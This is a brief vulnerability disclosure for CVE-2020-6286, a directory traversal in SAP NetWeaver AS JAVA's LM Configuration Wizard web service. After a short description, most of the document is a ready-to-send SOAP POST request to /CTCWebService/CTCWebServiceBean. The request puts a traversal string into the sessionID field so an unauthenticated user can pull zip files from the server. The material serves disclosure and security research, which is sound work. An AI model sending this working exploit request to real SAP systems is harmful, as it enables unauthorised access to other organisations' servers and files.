<b>[CVE-2020-6286] SAP NetWeaver AS JAVA (LM Configuration Wizard) Directory Traversal</b>
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SAP NetWeaver is SAP’s integrated technology platform and the technical foundation of all SAP applications since SAP Business Suite. SAP NetWeaver is a service-oriented application and integration platform that provides a development and running environment for SAP applications, and can also be used for custom development and integration with other applications and systems. The insufficient input path validation of certain parameter in the web service of SAP NetWeaver AS JAVA (LM Configuration Wizard), versions `7.30, 7.31, 7.40, 7.50`, allows an <i>unauthenticated</i> attacker to exploit a method to download zip files to a specific directory, leading to Path Traversal.

For safety proof of concept, you can use the following request. If zip file is exist on remote host, then downloads `111.zip` file
```
POST /CTCWebService/CTCWebServiceBean HTTP/1.1
Host: host
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Type: text/xml;charset=UTF-8
SOAPAction: 
Content-Length: 340

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
    <soapenv:Header />
    <soapenv:Body>
        <urn:queryProtocol>
            <sessionID>/../../../../../../../../../../../../../../../../../..111</sessionID>
        </urn:queryProtocol>
    </soapenv:Body>
</soapenv:Envelope>
```
